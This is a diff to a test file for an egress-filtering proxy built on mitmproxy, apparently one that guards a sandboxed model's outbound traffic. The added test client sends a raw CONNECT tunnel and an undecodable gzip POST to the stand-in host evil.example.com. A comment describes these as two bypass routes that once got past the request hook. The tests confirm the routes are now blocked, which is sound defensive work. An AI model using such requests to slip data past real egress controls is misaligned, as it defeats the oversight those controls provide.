@@ -229,6 +229,22 @@ _CLIENT = (
     "fetch('https://provider-peer/', 'TLS')\n"
     "fetch('http://provider-peer/', 'PLAIN')\n"
     "fetch('http://evil.example.com/', 'DENIED')\n"
+    # Two paths that reached a destination without the request hook ever deciding them (§10.5.0,
+    # spec-notes): a CONNECT tunnel, answered before any request inside it exists, and a body that
+    # does not decode under its Content-Encoding, which made the hook raise and mitmproxy forward.
+    "import socket\n"
+    "host, port = proxy.rsplit('//', 1)[-1].rsplit(':', 1)\n"
+    "def raw(payload, label):\n"
+    "    s = socket.create_connection((host, int(port)), timeout=25)\n"
+    "    s.sendall(payload)\n"
+    "    print(label + '_STATUS', s.recv(200).split(b' ')[1].decode())\n"
+    "    s.close()\n"
+    "raw(b'CONNECT evil.example.com:443 HTTP/1.1\\r\\nHost: evil.example.com:443\\r\\n\\r\\n', "
+    "'TUNNEL')\n"
+    "body = b'not-gzip-at-all'\n"
+    "raw(b'POST http://evil.example.com/x HTTP/1.1\\r\\nHost: evil.example.com\\r\\n'\n"
+    "    b'Content-Encoding: gzip\\r\\nContent-Length: ' + str(len(body)).encode() + "
+    "b'\\r\\n\\r\\n' + body, 'UNDECODABLE')\n"
 )
 
 
@@ -367,6 +383,13 @@ def test_a_real_run_injects_on_forward_blocks_on_deny_and_leaks_nothing(
         assert model_flows, f"no forwarded model flow recorded\n{context}"
         assert model_flows[0].egress_class == "model_api", context
         assert blocked, f"no blocked flow recorded\n{context}"
+        # (4) A CONNECT to a denied host is refused before it is dialled, and recorded. Without
+        # the http_connect gate mitmproxy answers 200 and relays whatever the tunnel carries.
+        assert "TUNNEL_STATUS 403" in out, context
+        assert any(f.method == "CONNECT" and f.host == "evil.example.com" for f in blocked), context
+        # (5) A request the hook cannot decode is refused and recorded, never forwarded undecided.
+        assert "UNDECODABLE_STATUS 502" in out, context
+        assert any("request hook failed" in f.block_reason for f in blocked), context
         log_text = "\n".join(flow_record_line(f) for f in flows)
         assert _REAL_KEY not in log_text, f"real key leaked into the flow log\n{context}"
         assert scoped_token not in log_text, f"scoped token leaked into the flow log\n{context}"
